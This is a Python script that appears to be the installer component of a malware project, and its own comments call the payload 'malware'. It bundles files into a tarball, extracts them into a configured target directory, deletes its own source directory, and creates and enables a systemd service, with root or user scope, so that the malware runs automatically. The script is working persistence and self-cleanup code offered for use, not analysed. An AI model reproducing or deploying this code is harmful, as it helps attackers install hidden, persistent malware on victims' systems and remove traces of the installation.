#!/usr/bin/python
import config
import os
import tarfile

# true if root priviledges false otherwise
isRoot = os.popen("echo $USER").read()=="root\n"
userData = config.root if isRoot else config.user


#fuction to remove a directory
def rem(target):
	if os.path.isfile(target):
		os.remove(target)

	else:
		for i in os.listdir(target):
			rem(target + "/" + i)
		os.rmdir(target)


# compress all files into tarbll for easy distribution
# out: output file
def compress(out):
	file = tarfile.open(out, "w")
	for i in os.listdir():
		if os.path.isfile(i) and i != out:
			file.add(i)
	file.close()

# move malware to target
# source: tarball to use
# force: overwrite if target folder exists
# clear: remove old files
def move(source, force=False, clear=True):
	target = os.path.expanduser(userData["targetDir"])

	if os.path.exists(target):
		if force:
			for i in os.listdir(target):
				os.remove(target+i)
			os.rmdir(target)
		else:
			return

	os.mkdir(target)

	with tarfile.open(source,"r") as file:
		file.extractall(target)

	if clear:
		rem(os.path.abspath("."))

# creates and enables a service to auto run the malware
# runFile: file service will run
def createService(runFile):
	data = config.service.format(targetPath = os.path.abspath(runFile))

	target = os.path.expanduser(userData["serviceLoc"])
	if not os.path.exists(target):
		os.makedirs(target)

	with open(target + config.serviceName, "w") as file:
		file.write(data)

	if isRoot:
		os.system("systemctl enable " + config.serviceName)
	else:
		os.system("systemctl --user enable " + config.serviceName)
